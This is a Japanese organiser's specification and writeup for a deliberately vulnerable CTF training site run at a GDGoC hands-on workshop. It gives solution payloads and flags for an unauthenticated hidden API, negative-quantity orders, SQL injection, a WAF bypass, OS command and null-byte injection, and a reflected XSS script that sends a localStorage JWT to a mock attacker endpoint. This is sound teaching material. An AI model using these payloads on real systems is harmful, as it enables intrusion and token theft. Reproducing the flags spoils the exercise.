# 居酒屋 極 (レジの助) - CTF・脆弱性シナリオ仕様書

本ドキュメントは、GDGoCハンズオン向けに意図的に作り込まれた脆弱性（CTFシナリオ）の全体像と、各問題の想定解法（Writeup）をまとめた主催者・管理者向けの仕様書です。

## 🌐 サイトの全体構造
- **フロントエンド**: HTML/Vanilla JS (Tailwind CSS)
- **バックエンド**: Cloudflare Workers (Hono) + Cloudflare D1 (SQLite)
- **認証**: JWT (JSON Web Token) をLocalStorageに保存し、Authorizationヘッダーで送信。

---

## 🎯 脆弱性・フラグ一覧と想定シナリオ

### 問題1: 隠しAPIの発見（Information Disclosure / 認証不備）
- **概要**: `table_2`（会計済み）でログインしたユーザーは `thankyou.html` に飛ばされる。ソースコードを見るとHTMLコメントに「`/api/v2/admin/tables` は認証チェックを外している」という開発者のメモがある。
- **想定解法**: 
  ブラウザで直接、または `fetch('/api/v2/admin/tables')` を実行する。
- **得られる情報**: 全卓の本当の合計金額がJSONで返ってくる（table_2が本当は4800円であることが発覚する）。

### 問題2: 負の注文（Logic Flaw / ビジネスロジックの欠陥）
- **概要**: 注文プレビュー用API `/api/v2/orders/preview` は、商品の数量がマイナス値であることをチェックしていない。
- **想定解法**:
  ```javascript
  fetch('/api/v2/orders/preview', {
      method: 'POST',
      headers: {'Authorization': 'Bearer ' + localStorage.getItem('token'), 'Content-Type': 'application/json'},
      body: JSON.stringify({ items: [{ menu_item_id: 1, quantity: -5 }] })
  }).then(r=>r.json()).then(console.log)
  ```
- **フラグ**: `GDGoC{N3g4t1v3_B1ll_H4ck3r}`

### 問題3: SQLインジェクション (SQLi)
- **概要**: メニュー検索API `/api/v2/menu/search?q=` は、入力値をサニタイズせずに直接SQL文に結合している。
- **想定解法**:
  `q=' OR 1=1 --` のように入力することで、非公開設定（`is_hidden = 1`）にされている裏メニューをすべて抽出する。
- **フラグ**: `GDGoC{SQL_1nj3ct10n_15_fUn}` （裏メニューのメニュー名として出現）

### 問題4: WAFバイパス（簡易WAFの回避）
- **概要**: 問題3の検索APIには簡易的なWAF（Web Application Firewall）が導入されており、`flag` という文字列を検知すると403エラーを返す。しかし、大文字小文字以外のエンコーディングなどは防げていない。
- **想定解法**:
  「flag」という単語を使わずに非公開メニューを引き出す（例: `q=' OR name LIKE '%GDGoC%' --` ）。
- **フラグ**: `GDGoC{Un1c0d3_3sc4p3_m4g1c}` （Adminのパスワードメモとして出現）

### 問題5: OSコマンドインジェクション / パストラバーサル
- **概要**: レシートPDF生成用API（疑似）`/api/v2/admin/receipt` の `filename` パラメータは、OSコマンドやNull Byteのインジェクションに脆弱。
- **想定解法 1 (OSコマンド)**:
  `filename` に `test.pdf; cat flag` のように `;` で区切ってOSコマンドを連結する。
  **フラグ**: `GDGoC{0S_C0mm4nd_1nj3ct10n_Pwn3d}`
- **想定解法 2 (Null Byte)**:
  `filename` に `%00` を含める。
  **フラグ**: `GDGoC{Null_Byt3_P01s0n1ng_M4st3r}`

### 問題6: Reflected XSS と LocalStorage JWT の窃取
- **概要**: 404エラー時にリダイレクトされる `/api/v2/error?msg=` は、メッセージをエスケープせずにHTMLに埋め込むため、Reflected XSSの脆弱性がある。
- **シナリオ**: 参加者は「自分自身が被害者」になったつもりで、XSSを用いてブラウザの `LocalStorage` に保存されている `token` を抜き出し、攻撃者のサーバー（今回は疑似Webhookの `/api/v2/admin/verify-token`）に送信させるペイロードを作成する。
- **想定解法 (XSSペイロード例)**:
  ```html
  <script>
    fetch('/api/v2/admin/verify-token', {
      method: 'POST',
      body: JSON.stringify({ token: localStorage.getItem('token') })
    })
    .then(r=>r.json())
    .then(d=>alert(d.flag));
  </script>
  ```
  このスクリプトをURLエンコードして `?msg=` に渡してアクセスする。
- **フラグ**: `GDGoC{L0c4lSt0r4g3_T0k3n_H1j4ck3d}`

---
## 🚀 ハンズオン進行のアドバイス
- まずは参加者に `/?t=table_2` にアクセスさせ、会計完了画面に飛ばされる理不尽さを体験してもらいます。
- 「ソースコードを見てみよう」「DevToolsのネットワークタブを見てみよう」といったヒントを随時出しながら、隠しAPIの発見（問題1）へ誘導します。
- XSSの問題（問題6）では、通常「bot」を使用しますが、本構成では「参加者自身がXSSを踏んで自分のトークンを盗む」という一人二役で動作確認ができるようになっています。
